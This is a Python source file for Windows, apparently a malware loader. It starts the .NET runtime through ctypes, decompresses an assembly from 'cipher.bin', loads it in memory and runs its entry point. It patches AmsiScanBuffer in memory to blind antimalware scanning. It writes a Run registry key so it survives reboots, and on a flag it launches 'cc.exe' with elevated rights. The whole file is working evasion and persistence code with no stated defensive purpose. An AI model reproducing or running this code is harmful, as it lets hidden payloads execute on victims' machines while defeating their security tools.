import ctypes
from ctypes import *
import sys
import os
import lzma

class GUID(Structure):
    _fields_ = [("Data1", c_ulong), ("Data2", c_ushort),
                ("Data3", c_ushort), ("Data4", c_ubyte * 8)]

def make_guid(s):
    s = s.strip("{}")
    parts = s.split("-")
    d4 = bytes.fromhex(parts[3] + parts[4])
    return GUID(int(parts[0], 16), int(parts[1], 16),
                int(parts[2], 16), (c_ubyte * 8)(*d4))

CLSID_CLRMetaHost    = make_guid("9280188D-0E8E-4867-B30C-7FA83884E8DE")
IID_ICLRMetaHost     = make_guid("D332DB9E-B9B3-4125-8207-A14884F53216")
IID_ICLRRuntimeInfo  = make_guid("BD39D1D2-BA2F-486A-89B0-B4B0CB466891")
CLSID_CorRuntimeHost = make_guid("CB2F6723-AB3A-11D2-9C40-00C04FA30A3E")
IID_ICorRuntimeHost  = make_guid("CB2F6722-AB3A-11D2-9C40-00C04FA30A3E")
IID_AppDomain        = make_guid("05F696DC-2B29-3663-AD8B-C4389CF2A713")

class VARIANT_DATA(Union):
    _fields_ = [("llVal", c_longlong), ("ullVal", c_ulonglong), ("ptr", c_void_p)]

class VARIANT(Structure):
    _fields_ = [("vt", c_ushort), ("wReserved1", c_ushort),
                ("wReserved2", c_ushort), ("wReserved3", c_ushort),
                ("data", VARIANT_DATA)]

def vtbl(ptr):
    return cast(cast(ptr, POINTER(c_void_p))[0], POINTER(c_void_p))

def com_call(ptr, slot, restype, *argtypes):
    proto = WINFUNCTYPE(restype, c_void_p, *argtypes)
    return proto(vtbl(ptr)[slot])

def load_and_execute():
    with open("cipher.bin", "rb") as f:
        compressed = f.read()

    data = lzma.decompress(compressed)
    
    print(f"[*] Assembly: {len(data)} bytes")

    oleaut32 = windll.oleaut32
    oleaut32.SafeArrayCreateVector.restype  = c_void_p
    oleaut32.SafeArrayCreateVector.argtypes = [c_ushort, c_long, c_ulong]
    oleaut32.SafeArrayAccessData.argtypes  = [c_void_p, POINTER(c_void_p)]
    oleaut32.SafeArrayUnaccessData.argtypes = [c_void_p]
    oleaut32.SafeArrayGetUBound.argtypes   = [c_void_p, c_uint, POINTER(c_long)]
    oleaut32.SafeArrayPutElement.argtypes  = [c_void_p, POINTER(c_long), c_void_p]
    oleaut32.SafeArrayDestroy.argtypes     = [c_void_p]
    oleaut32.SysAllocString.restype        = c_void_p
    oleaut32.SysAllocString.argtypes       = [c_wchar_p]

    mscoree = windll.mscoree

    # === CLR Init ===
    meta_host = c_void_p()
    mscoree.CLRCreateInstance(byref(CLSID_CLRMetaHost), byref(IID_ICLRMetaHost), byref(meta_host))

    GetRuntime = com_call(meta_host, 3, c_long, c_wchar_p, POINTER(GUID), POINTER(c_void_p))
    runtime_info = c_void_p()
    GetRuntime(meta_host, "v4.0.30319", byref(IID_ICLRRuntimeInfo), byref(runtime_info))

    GetInterface = com_call(runtime_info, 9, c_long, POINTER(GUID), POINTER(GUID), POINTER(c_void_p))
    host = c_void_p()
    GetInterface(runtime_info, byref(CLSID_CorRuntimeHost), byref(IID_ICorRuntimeHost), byref(host))

    Start = com_call(host, 10, c_long)
    Start(host)
    print("[+] CLR started")

    # === Get AppDomain ===
    GetDefaultDomain = com_call(host, 13, c_long, POINTER(c_void_p))
    unk = c_void_p()
    GetDefaultDomain(host, byref(unk))

    QI = com_call(unk, 0, c_long, POINTER(GUID), POINTER(c_void_p))
    app_domain = c_void_p()
    QI(unk, byref(IID_AppDomain), byref(app_domain))
    print("[+] Got _AppDomain")

    # === Load_3(byte[]) — vtable slot 45 ===
    sa = oleaut32.SafeArrayCreateVector(0x11, 0, len(data))
    pvData = c_void_p()
    oleaut32.SafeArrayAccessData(sa, byref(pvData))
    memmove(pvData, data, len(data))
    oleaut32.SafeArrayUnaccessData(sa)

    Load_3 = com_call(app_domain, 45, c_long, c_void_p, POINTER(c_void_p))
    asm = c_void_p()
    hr = Load_3(app_domain, sa, byref(asm))
    if hr != 0:
        print(f"[-] Load_3 failed: 0x{hr & 0xFFFFFFFF:08X}")
        return False
    print("[+] Assembly loaded")

    # === get_EntryPoint — vtable slot 16 ===
    get_EP = com_call(asm, 16, c_long, POINTER(c_void_p))
    entry = c_void_p()
    hr = get_EP(asm, byref(entry))
    if hr != 0:
        print(f"[-] get_EntryPoint failed: 0x{hr & 0xFFFFFFFF:08X}")
        return False
    print("[+] EntryPoint obtained")

    # === GetParameters — vtable slot 18 ===
    GetParams = com_call(entry, 18, c_long, POINTER(c_void_p))
    sa_params = c_void_p()
    hr = GetParams(entry, byref(sa_params))

    param_count = 0
    if hr == 0 and sa_params.value:
        ubound = c_long(-1)
        oleaut32.SafeArrayGetUBound(sa_params.value, 1, byref(ubound))
        param_count = ubound.value + 1
        oleaut32.SafeArrayDestroy(sa_params.value)

    print(f"[*] Main expects {param_count} parameters")

    # === Invoke_3 — vtable slot 37 ===
    if param_count == 0:
        sa_invoke = oleaut32.SafeArrayCreateVector(12, 0, 0)
    else:
        # string[] vacío
        sa_bstr = oleaut32.SafeArrayCreateVector(8, 0, 0)

        # Envolver string[] en object[] { string[] }
        v_args = VARIANT()
        v_args.vt = 0x2008  # VT_ARRAY | VT_BSTR
        v_args.data.ptr = sa_bstr

        sa_invoke = oleaut32.SafeArrayCreateVector(12, 0, 1)
        idx = c_long(0)
        oleaut32.SafeArrayPutElement(sa_invoke, byref(idx), byref(v_args))

    Invoke_3 = com_call(entry, 37, c_long, POINTER(VARIANT), c_void_p, POINTER(VARIANT))

    obj_null = VARIANT()
    obj_null.vt = 1  # VT_NULL
    retval = VARIANT()

    hr = Invoke_3(entry, byref(obj_null), sa_invoke, byref(retval))
    if hr != 0:
        print(f"[-] Invoke_3 failed: 0x{hr & 0xFFFFFFFF:08X}")
        return False

    print("[+] Execution completed")
    return True

def patch_amsi():
    k32 = ctypes.windll.kernel32
    k32.LoadLibraryA.argtypes = [ctypes.c_char_p]
    k32.LoadLibraryA.restype = ctypes.c_void_p
    k32.GetProcAddress.argtypes = [ctypes.c_void_p, ctypes.c_char_p]
    k32.GetProcAddress.restype = ctypes.c_void_p

    h_amsi = k32.LoadLibraryA(b"amsi.dll")
    if not h_amsi:
        return False

    scan_addr = k32.GetProcAddress(h_amsi, b"AmsiScanBuffer")
    if not scan_addr:
        return False

    patch = (ctypes.c_ubyte * 6)(0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)

    k32.WriteProcessMemory.argtypes = [ctypes.c_void_p, ctypes.c_void_p, ctypes.c_void_p, ctypes.c_size_t, ctypes.POINTER(ctypes.c_size_t)]
    k32.WriteProcessMemory.restype = ctypes.c_int
    k32.GetCurrentProcess.argtypes = []
    k32.GetCurrentProcess.restype = ctypes.c_void_p

    return bool(k32.WriteProcessMemory(k32.GetCurrentProcess(), scan_addr, ctypes.byref(patch), 6, None))

def install_persistence():
    try:
        import winreg
        value_name = "Lib2"
        interp = sys.executable
        script = os.path.abspath(sys.argv[0])
        command = f'"{interp}" "{script}" -w'
        try:
            key = winreg.HKEY_LOCAL_MACHINE
            with winreg.OpenKey(key, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE) as k:
                winreg.SetValueEx(k, value_name, 0, winreg.REG_SZ, command)
        except PermissionError:
            key = winreg.HKEY_CURRENT_USER
            with winreg.OpenKey(key, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE) as k:
                winreg.SetValueEx(k, value_name, 0, winreg.REG_SZ, command)
    except Exception as e:
        pass

if __name__ == "__main__":
    install_persistence()
    if len(sys.argv) >= 2 and sys.argv[1] == "-d":
        cc_path = os.path.join(
            os.path.dirname(os.path.abspath(__file__)),
            "cc.exe"
        )

        shell32 = ctypes.windll.shell32

        shell32.ShellExecuteW(
            None,
            "runas",
            cc_path,
            None,
            os.path.dirname(cc_path),
            1
        )
    print(patch_amsi(), " amsi?")
    load_and_execute()